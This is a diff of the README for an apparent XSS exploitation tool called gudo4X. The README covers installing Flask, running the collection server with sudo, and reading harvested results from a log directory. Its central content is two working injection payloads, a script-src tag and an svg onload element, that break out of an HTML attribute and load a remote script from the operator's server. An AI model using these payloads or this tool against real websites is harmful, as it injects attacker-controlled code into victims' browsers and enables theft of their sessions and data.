@@ -1,26 +1,27 @@
+## gudo4X - guide dog for xss
 
 ### usage
-* requires python 3 and flask
+* install flask
 
 ```bash
 sudo apt update && sudo apt install -y python3-flask
 ```
 
-* put ssl files in project (cert.pem, key.pem)
+* (for https) put cert files in project directory (cert.pem, key.pem)
 
-* run on your server:
+* run:
 
 ```bash
-sudo python3 server.py 443
+sudo run.sh
 ```
 
-* load this script with an xss:
+* send the script in a xss:
 ```html
-'"><script/src=https://yourserver/s.js></script>
-```
-* alternatively:
-```html
-'"><svg/onload=body.appendChild(document.createElement`script`).src="https://yourserver/s.js">
+'"><script/src=https://yourserver/a.js></script>
 ```
 
-* see the files in the log directory
+```html
+'"><svg/onload=body.appendChild(document.createElement`script`).src="https://yourserver/a.js">
+```
+
+* see the log directory
